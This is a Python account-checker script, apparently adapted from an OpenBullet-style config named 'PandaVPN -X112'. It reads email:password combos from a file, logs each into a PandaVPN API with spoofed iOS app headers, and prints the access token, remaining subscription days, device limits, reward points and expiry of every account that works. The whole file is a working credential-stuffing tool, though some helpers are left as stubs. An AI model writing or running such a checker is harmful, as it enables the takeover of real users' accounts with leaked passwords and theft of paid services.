import requests
import json

# Settings
settings = {
    "Name": "PandaVPN -X112",
    "SuggestedBots": 100,
    # ... (other settings)
}

# Script
def generate_guid():
    # Implementation for generating GUID
    return "A1234567"  # Replace with actual implementation

def clear_cookies():
    # Implementation for clearing cookies
    pass

def login(email, password, device_token):
    url = "https://api.pandaglen.pw/api/v2/users/app/login"
    headers = {
        "Host": "api.pandaglen.pw",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Product-Identifier": "Panda",
        "Api-Version": "v2.0",
        "X-Timestamp": "1689298943",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Alamofire/6.6.0 iOS/15.0.2 Panda/6.6.0(66005)",
        "Content-Length": "194",
        "Accept-Language": "en-US",
        # ... (other headers)
    }
    data = {
        "password": password,
        "deviceType": "IOS",
        "deviceName": "iOS 15.0.2 iPhone 6s",
        "clientVersion": "6.6.0",
        "account": email,
        "deviceToken": device_token,
    }

    try:
        response = requests.post(url, json=data, headers=headers)
        response.raise_for_status()  # Raise an exception for bad responses
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during login: {e}")
        return None

# Example usage
if __name__ == "__main__":
    # Read accounts from file
    with open("accounts.txt", "r") as file:
        accounts = [line.strip() for line in file]

    # Generate GUID
    guid = generate_guid()

    # Clear cookies
    clear_cookies()

    # Login for each account
    for account in accounts:
        email, password = account.split(":")
        device_token = guid  # Use the generated GUID as the device token
        response_data = login(email, password, device_token)

        if response_data:
            # Parse the response_data as needed
            access_token = response_data.get("accessToken", "")
            web_access_token = response_data.get("webAccessToken", "")
            register_at = response_data.get("registerAt", "")
            max_device_count = response_data.get("maxDeviceCount", "")
            max_device_support = response_data.get("maxDeviceCount", "")
            left_days = response_data.get("leftDays", "")
            pass_reset_required = response_data.get("resetPassword", "")
            point_amount = response_data.get("rewardPoints", "")
            exp_date = response_data.get("dueTime", "").replace("T", "")
            # ... (other parsing)

            print(f"Login successful for {email}. Access Token: {access_token}")
            print(f"Register Date: {register_at}")
            print(f"Max Device Count: {max_device_count}")
            print(f"Max Device Support: {max_device_support}")
            print(f"Left Days: {left_days}")
            print(f"Pass Reset Required: {pass_reset_required}")
            print(f"Point Amount: {point_amount}")
            print(f"Exp Date: {exp_date}")
        else:
            print(f"Login failed for {email}.")
